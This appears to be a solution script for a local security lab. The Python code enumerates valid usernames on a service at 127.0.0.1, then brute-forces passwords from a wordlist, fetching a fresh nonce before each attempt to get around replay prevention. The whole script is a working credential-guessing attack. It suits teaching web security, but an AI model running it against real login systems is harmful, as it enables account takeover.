# Hints:
# - First examine the request and response traffic using a browser and Burp
# - See if you can figure out how the replay prevention mechanism works.  Can you defeat it to log in?
# - Consider using the requests module to do this in Python
#
# IMPORTANT: Stop the service (Ctrl-C) when you are done with the lab

import requests

nonce_locator = 'name="nonce" value="'


def find_name():
    name_file = open('names.txt', 'r')

    names = name_file.readlines()
    name_file.close()

    for name in names:
        data = {'username': name.strip()}
        response = requests.post('http://127.0.0.1:9942/password', data)
        if response.text.find('Username: ') == -1:
            return name.strip()


def get_nonce(name):
    data = {'username': name.strip()}
    response = requests.post('http://127.0.0.1:9942/password', data)
    nonce_start = response.text.find(nonce_locator) + len(nonce_locator)
    nonce_end = response.text.find('"', nonce_start)
    return response.text[nonce_start: nonce_end]

# <form method="post" action="/login">
# Password: <input type="password" name="password"><br>
#             <input type="hidden" name="username" value="pintel">
#             <input type="hidden" name="nonce" value="E1eBC7A96b02DcF4d53a">

def submit_password(name, nonce, password):
    data = {'username': name, 'nonce': nonce, 'password': password}
    response = requests.post('http://127.0.0.1:9942/login', data)
    return response.text.find('Try again') == -1


if __name__ == '__main__':
    name = find_name()
    if name is None:
        print('No matching name...')
    else:
        print('Pirate Name: {}'.format(name))
        password_file = open('passwords.txt', 'r')
        password_list = password_file.readlines()
        for password in password_list:
            nonce = get_nonce(name)
            if submit_password(name, nonce, password.strip()):
                print('Password: {}'.format(password.strip()))
                break